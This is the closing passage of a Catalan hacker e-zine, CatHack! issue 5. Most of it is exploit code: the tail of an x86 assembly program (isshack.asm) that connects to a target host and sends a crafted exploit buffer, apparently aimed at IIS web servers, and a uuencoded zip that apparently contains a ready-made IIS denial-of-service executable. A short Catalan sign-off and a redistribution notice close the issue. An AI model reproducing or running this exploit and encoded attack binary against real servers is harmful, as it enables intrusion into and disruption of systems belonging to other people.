	jmp     quit3
@@2:
	lea     edi, _port
	call    parse
	or      ecx, ecx
	jnz     @@3
	push    no_urll
	push    offset no_url
	call    write_console
	jmp     quit3

@@3:
	push    ecx
	lea     edi, _url
	call    parse
	pop     ecx
	cmp     ecx, 71
	jb      length_ok
	push    u_lengthl
	push    offset u_length
	call    write_console
	jmp     quit3

length_ok:
	
	mov     esi, offset _url
	mov     edi, offset _url2
@@10:
	xor     al, al
	lodsb
	cmp     al, 02fh
	jz      whaq
	test    al, al
	jz      @@20
	add     al, 021h
	stosb
	jmp     @@10
@@20:
	push    urlinvl
	push    offset urlinv
	call    write_console
	jmp     quit3
	

whaq:
	push    esi
	lea     esi, stuff
	lodsw
	stosw
	lodsd
	stosd
	pop     esi
fileget:        
	xor     al, al
	lodsb
	test    al, al
	jz      getdone
	add     al, 021h
	stosb
	jmp     fileget
getdone:

	push    offset wsadata
	push    0101h
	call    WSAStartup
	or      eax, eax
	jz      winsock_found

	push    errorinitl
	push    offset errorinit
	call    write_console
	jmp     quit3

winsock_found:
	xor     eax, eax
	push    eax
	inc     eax
	push    eax
	inc     eax
	push    eax
	call    socket
	cmp     eax, -1
	jnz     socket_ok

	push    sockerrl
	push    offset sockerr
	call    write_console
	jmp     quit2

socket_ok:
	mov     sock, eax
	mov     sin.sin_family, 2
	mov     esi, offset _port
lewp1:
	xor     al, al
	lodsb
	test    al, al
	jz      go
	cmp     al, 039h
	ja      port_error
	cmp     al, 030h
	jb      port_error
	jmp     lewp1

port_error:
	push    porterrl
	push    offset porterr
	call    write_console
	jmp     quit1

go:

	mov     ebx, offset _port
	call    str2num
	mov     eax, edx
	push    eax
	call    htons
	mov     sin.sin_port, ax

	mov     esi, offset _host
lewp:
	xor     al, al
	lodsb
	cmp     al, 039h
	ja      gethost
	test    al, al
	jnz     lewp
	push    offset _host
	call    inet_addr
	cmp     eax, -1
	jnz     ip_aight
	push    ipilll
	push    offset ipill
	call    write_console
	jmp     quit1

ip_aight:
	mov     sin.sin_addr, eax
	jmp     continue

gethost:
	push    offset _host
	call    gethostbyname
	test    eax, eax
	jnz     gothost

	push    reshostl
	push    offset reshost
	call    write_console
	jmp     quit1

gothost:
	mov     eax, [eax+0ch]
	mov     eax, [eax]
	mov     eax, [eax]
	mov     sin.sin_addr, eax

continue:
	push    size sin
	push    offset sin
	push    sock
	call    connect
	or      eax, eax
	jz      connect_ok
	push    cnerrorl
	push    offset cnerror
	call    write_console
	jmp     quit1

connect_ok:

	xor     eax, eax
	push    eax
	push    sploit_length
	push    offset sploit
	push    sock
	call    send
	push    successl
	push    offset success
	call    write_console

quit1:
	push    sock
	call    closesocket
quit2:
	call    WSACleanup
quit3:
	push    0
	call    ExitProcess
parse   proc
;cheap parsing.. hell.. its only an exploit.

lewp9:
	xor     eax, eax
	cld
	lodsb
	cmp     al, 20h
	jz      done
	test    al, al
	jz      done2
	stosb
	dec     ecx
	jmp     lewp9
done:
	dec     ecx
done2:
	ret
endp

str2num proc
	push    eax ecx edi
	xor     eax, eax
	xor     ecx, ecx
	xor     edx, edx
	xor     edi, edi
lewp2:
	xor     al, al
	xlat
	test    al, al
	jz      end_it
	sub     al, 030h
	mov     cl, al
	mov     eax, edx
	mul     numbase
	add     eax, ecx
	mov     edx, eax
	inc     ebx
	inc     edi
	cmp     edi, 0ah
	jnz     lewp2

end_it:
	pop     edi ecx eax
	ret
endp

init_console  proc
	push    -10
	call    GetStdHandle
	or      eax, eax
	je      init_error
	mov     [console_in], eax
	push    -11
	call    GetStdHandle
	or      eax, eax
	je      init_error
	mov     [console_out], eax
	ret
init_error:
	push    0
	call    ExitProcess
endp

write_console proc    text_out:dword, text_len:dword
	pusha
	push    0
	push    offset bytes_read 
	push    text_len          
	push    text_out          
	push    console_out       
	call    WriteConsoleA
	popa
	ret
endp

end     start

--------[isshack.asm]---------------------------------------------------------


--------[issdos.uue]----------------------------------------------------------

_=_ 
_=_ Part 001 of 001 of file iisdos.zip
_=_ 

begin 666 iisdos.zip
M4$L#!!0``@`(`$BNKBC*["$4U@0```!````*````:6ES9&]S+F5X9>V;?6@<
M113`Y])4\<JU$:REBG2"7M%_-CN[^3*4<D=R)J&)N?2NGBW8WN9NDKUT;_?<
MW4M;\(]*58H!"=9BD2B%A.)'*44*IJ72T_K1@*5^MU+_J%+PI!1M2ZV*>KZ=
MO38M!L4_`J6\W[WW9M[,FYDW<W<+"[N]Z^*DAA!22Q:12H60*>(3(?>0_R1`
MR*$ZLG#9@3N.UT\%>H[7CXTE]9Q#"[8U9&MYFB\Z+AW@U"Z:M&AFN4U3.5-5
M0L$'6LA-0CQ&2$^@EKSU8.?RJVUGR`M/+PC4+(5#(:2YVEA75>J?CJC7B",0
MU%X=O'7&F7?UD&BUK)N9ZAII0OX(_$N"!4*R<[#O]KZ.V`W[\G*^[<882#O=
M$4U&JS\(?Q\*:/#&..@J2;FLYFK5N=+^V9`5L\39W+`RU;A"-6[E/^+B!$&0
M.4<MJ:?5S]5I]1>UHIX?OES>"Q>CB=;^""D?@MKHKP<K@%)*7=QWY;,-^^G%
M?=VC5[:N)(N>"4+WUI74S8\!1T[*$7)I4E<;(D0/0$]Y3\";/!Z!CYAS]-3$
M"8@9_'C^$2AJR)3W%X^7GX6NP8GWH$GWIBCO\)8_"K7A.MT+3)3[H65!R0UZ
MRYQ[;?"1<SO4TI&3+$(.EN$">^E-\$8D\.XBOA?71Q82HA/J#6Z%P>GQ8:(W
MPHZ&[]670%%I$MN;AOA7M?3HXF60<WD]>-JV^5X],#.@1E=F!NP2`Q+ECZ`L
M?P'FQQ`<S3`IOTRN6T3?"9[^O'1MF":&G3N96MT?5Z=%KOVC[Q_R#O^@=R&]
M<N'%6GG[[9UKH]M^)\6SV_X,N+7>7OMFT@BDJG,M%G-]?_;QM>LV'*V$Q]*P
M2O@E87<).R[L;F$GA7U=V+W"[A?V@+"'A2T)^X&PQX3]1-A/A?U2V%/"?IN.
MX+_EUJ,SEJ0-X>:'P\VQ<'-CN+DIW-(:5F(H*"@H*"@H*"@H*"@H*/]/6M1P
M"]Q7=M"N9#+>P"0Y%`P%9[L3[>Y.T$9)ILMI$]@.;N8T@UJ#-,'MD5R&AX(#
M6]KH&L>Q0\%!RZ:.5;0SG&:L+*?@#N1,S=Y"ARSJ6FU4=]U"6T/#IDV;I"*,
M&-`R&Z6,E6_PUE[C:$.\C>:WT"[+<;L+H6!LLY8O&'Z;(C=)K+55:FR1FF?/
M$[G)P6\-01`$01`$01`$01`$01`$01`$01`$01`/:V-]&TUP,YLSAVB'U"<E
MQ),F$G!K/16R(CU3/POU,5#]NK8+4#^<GGWL7]!>IQ%"0670#M`>T/6@!NA3
MH-LU/_85*"=!WP8M@1X#_1KT#*CWBM3/VMS-N2JV^M%8CZI(6<,@J41?^ZIJ
M'7@L9[M%S8C;ELLSKM?2R=V$F^W2S*S!/3]EYUS>;IF.9?"HW]]K98L&]T/$
MV[$)@_."W]=NY?/0T9,S15=L<\Z%R3/<<<!KM[GF\J0.A7BIUW!<V^!FM+JN
M%QC-9FT_F&0LT_23RAB6PQTKLY%[7BH13;@:Y.TM2707<O-;VPVNF7[KM6#B
MP*_8*VV>&?%*2,S=H,$J_N'4^>\7WRUWR7VR(3OR<_*HO%,>E]^1/Y2_D<OR
M3_)E>1Y;Q)8RRI:S7I9B3[`GV6[V!GN7'673[`3[BIUFW[$?V'EVB?W&*FR^
MLD"Y4UFBW*?<KSRDX,7D9N9O4$L!`A0`%``"``@`2*ZN*,KL(136!````$``
M``H````````````@`/^!`````&EI<V1O<RYE>&502P4&``````$``0`X````
&_@0`````
`
end
--------[issdos.uue]----------------------------------------------------------


							Oi! you! is the voice!
						     and smash with your head!
								   -OPCIó K95-


------------------------------------------------------------------------------
==============================================================================
//////////////////////////////////////////////////////////////////////////////
010101010101010101010101010101010101010101010101010101010101010101010101010101
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
==============================================================================
------------------------------------------------------------------------------

$14$
 _______________
|               |
| Acomiadament: |
|_______________|

Doncs fins aqui una revista més de CatHack!, esperem que us hagi agradat i
seguim esperant la vostra col·laboració, ja que sense ella el projecte de la
revista es fa trist i monòton, per enviar textes (escrits per vosaltres :) en
català i alienats a 78 columnes i ansi feu-ho a poptph@hotmail.com, mirarem de
respondre el més ràpid possible. També podeu enviar suggeriments o comentaris.

Esperem la vostra col·laboració.



    And the beast shall come forth surrounded by a roiling cloud of vengeance.
     The house of the unbelievers shall be razed and they shall be scorched to
		      the earth. Their tags shall blink until the end of days. 

					       from The Book of Mozilla, 12:10
						   (Netscape -> about:mozilla)


- CatHack!#005 -
 ____________________________________________________________________________
|                                                                            |
|   CatHack!  es  pot  distribuïr  lliurement  sense  impossar  cap  taxa,   |
|   sempre  i  quan  no   es  modifiqui  el   contigut  de   la   revista.   |
|____________________________________________________________________________|
